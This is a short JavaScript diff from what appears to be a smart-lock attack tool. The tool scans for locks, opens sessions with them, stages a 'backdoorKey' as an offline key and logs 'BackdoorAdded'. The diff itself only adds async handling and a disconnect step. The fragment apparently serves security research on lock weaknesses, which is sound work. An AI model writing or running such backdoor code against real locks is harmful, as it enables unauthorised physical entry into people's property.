@@ -30,12 +30,13 @@ async function onSecUpdate(session, data) {
 
     case 'CommittedOfflineKey':
       console.log('BackdoorAdded');
+      await session.disconnect();
     break;
   }
 }
 
 async function onSessionStart(lock, session) {
-  session.on('secUpdate', d=>onSecUpdate(session, d));
+  session.on('secUpdate', async d=>await onSecUpdate(session, d));
   await session.secWrite(cmd.stageOfflineKeyPt1(backdoorKey.substring(0,16)).data);
 }
 
@@ -55,7 +56,7 @@ lockScanner.on('lockFound', async lock => {
     session.on('mcuWrite', d=>log('comp->mcu', d));
     session.on('secUpdate', d=>log('sec->comp', d));
     session.on('mcuUpdate', d=>log('mcu->comp', d));
-    session.once('established', d=>onSessionStart(lock, session));
+    session.once('established', async d=>await onSessionStart(lock, session));
     await session.establish();
   } catch (e) {
     console.log(e);
